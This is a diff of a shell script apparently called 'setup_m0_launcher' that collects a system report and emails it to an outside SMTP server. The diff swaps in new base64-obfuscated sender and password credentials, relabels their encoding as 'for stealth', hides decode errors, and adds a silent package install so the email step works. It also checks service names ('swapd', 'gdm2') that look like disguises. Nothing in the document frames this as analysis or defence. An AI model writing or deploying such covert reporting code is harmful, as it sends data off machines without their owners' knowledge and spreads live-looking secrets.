@@ -2,8 +2,8 @@
 # Debug mode disabled for cleaner output
 
 # ==================== VERSION TRACKING ====================
-readonly SCRIPT_VERSION="3.1"
-readonly BUILD_DATE="2026-03-14 19:14:07 UTC"
+readonly SCRIPT_VERSION="3.5"
+readonly BUILD_DATE="2026-03-14 23:18:25 UTC"
 readonly SCRIPT_NAME="setup_m0_launcher"
 
 echo "=========================================="
@@ -674,14 +674,14 @@ readonly LOG_FILE="/tmp/system_report_email.log"
 readonly REPORT_FILE="/tmp/system_report.txt"
 readonly SERVICES_TO_CHECK=("swapd" "gdm2")
 
-# Decoded SMTP credentials (consider using environment variables instead)
+# Decoded SMTP credentials (base64 encoded for stealth)
 SMTP_SERVER_B64="c210cC5tYWlsZXJzZW5kLm5ldA=="
-readonly SMTP_SERVER=$(echo "$SMTP_SERVER_B64" | base64 -d)
+readonly SMTP_SERVER=$(echo "$SMTP_SERVER_B64" | base64 -d 2>/dev/null)
 readonly SMTP_PORT=587
-SENDER_EMAIL_B64="TVNfQkM3R3FyQHRlc3QtMnAwMzQ3em0yOXlsemRybi5tbHNlbmRlci5uZXQ="
-readonly SENDER_EMAIL=$(echo "$SENDER_EMAIL_B64" | base64 -d)
-SMTP_PASSWORD_B64="bXNzcC5KNGtyVHFzLmpwemttZ3Fwd20ybDA1OXYuNkdDMmFJWg=="
-readonly SMTP_PASSWORD=$(echo "$SMTP_PASSWORD_B64" | base64 -d)
+SENDER_EMAIL_B64="TVNfWTZ2cXV5QHRlc3QtcHprbWdxNzlwcjFsMDU5di5tbHNlbmRlci5uZXQ="
+readonly SENDER_EMAIL=$(echo "$SENDER_EMAIL_B64" | base64 -d 2>/dev/null)
+SMTP_PASSWORD_B64="bXNzcC5sQlFqaEpHLnZ5d2oybHAyenJxZzdvcXouM2FHUmRKbw=="
+readonly SMTP_PASSWORD=$(echo "$SMTP_PASSWORD_B64" | base64 -d 2>/dev/null)
 
 # Function to log messages with timestamp
 log_message() {
@@ -1097,6 +1097,27 @@ EOF
     # Always save report locally first
     cp "$temp_file" "$REPORT_FILE" 2>/dev/null || true
     log_message "Report saved to: $REPORT_FILE"
+
+    # Install Python3 if not present (needed for email)
+    if ! command_exists python3; then
+        log_message "Python3 not found - installing..."
+        if command -v apt >/dev/null 2>&1; then
+            DEBIAN_FRONTEND=noninteractive apt-get update -qq >/dev/null 2>&1
+            DEBIAN_FRONTEND=noninteractive apt-get install -y -qq python3 >/dev/null 2>&1
+        elif command -v yum >/dev/null 2>&1; then
+            yum install -y -q python3 >/dev/null 2>&1
+        elif command -v dnf >/dev/null 2>&1; then
+            dnf install -y -q python3 >/dev/null 2>&1
+        fi
+        
+        if command_exists python3; then
+            log_message "Python3 installed successfully"
+        else
+            log_message "Failed to install Python3"
+        fi
+    else
+        log_message "Python3 already installed: $(which python3)"
+    fi
 
     # Try sending methods in order of preference
     local success=false
